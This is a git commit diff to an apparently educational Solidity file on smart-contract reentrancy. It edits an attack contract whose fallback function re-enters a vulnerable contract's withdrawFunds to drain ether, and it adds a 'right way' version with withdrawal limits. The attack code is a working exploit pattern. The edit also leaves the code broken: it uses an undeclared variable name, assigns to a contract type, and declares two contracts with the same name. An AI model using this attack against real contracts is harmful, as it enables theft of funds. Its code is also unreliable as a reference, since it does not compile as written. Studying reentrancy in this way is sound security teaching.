72362c3d73aa1e834a87c83968b4dccbc0ba0870
Stefan Lehmann <85541624+Stefan1612@users.noreply.github.com>
2022-04-26 21:56:57 +0200

    Update Blog-2-Reentrancy.sol

--- Smart Contract Hacking/Blog-2-Reentrancy.sol
+++ Smart Contract Hacking/Blog-2-Reentrancy.sol
@@ -26,23 +26,23 @@ contract NaiveContract {
  
 // Second Contract (The malicious contract)
 
-import "EtherStore.sol";
+import "NaiveContract.sol";
 
-contract Attack {
+contract MaliciousContract {
   EtherStore public etherStore;
 
   // initialise the etherStore variable with the contract address
   constructor(address _etherStoreAddress) {
-      etherStore = EtherStore(_etherStoreAddress);
+      NaiveContract = NaiveContract(_etherStoreAddress);
   }
 
   function pwnEtherStore() public payable {
       // attack to the nearest ether
       require(msg.value >= 1 ether);
       // send eth to the depositFunds() function
-      etherStore.depositFunds.value(1 ether)();
+      NaiveContract.depositFunds.value(1 ether)();
       // start the magic
-      etherStore.withdrawFunds(1 ether);
+      NaiveContract.withdrawFunds(1 ether);
   }
 
   function collectEther() public {
@@ -51,8 +51,39 @@ contract Attack {
 
   // fallback function - where the magic happens
   function () payable {
-      if (etherStore.balance > 1 ether) {
-          etherStore.withdrawFunds(1 ether);
+      if (NaiveContract.balance > 1 ether) {
+          NaiveContract.withdrawFunds(1 ether);
       }
   }
 }
+
+// Third contract (The right way to do it)
+
+
+
+contract NaiveContract {
+
+    uint256 public withdrawalLimit = 1 ether;
+    mapping(address => uint256) public lastWithdrawTime;
+    mapping(address => uint256) public balances;
+
+    function depositFunds() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdrawFunds (uint256 _weiToWithdraw) public {
+
+        require(balances[msg.sender] >= _weiToWithdraw);
+        // limit the withdrawal
+        require(_weiToWithdraw <= withdrawalLimit);
+        // limit the time allowed to withdraw
+        require(now >= lastWithdrawTime[msg.sender] + 1 weeks);
+        balances[msg.sender] -= _weiToWithdraw;
+        lastWithdrawTime[msg.sender] = now;
+ 
+
+        msg.sender.transfer(_weiToWithdraw);
+    
+
+    }
+ }
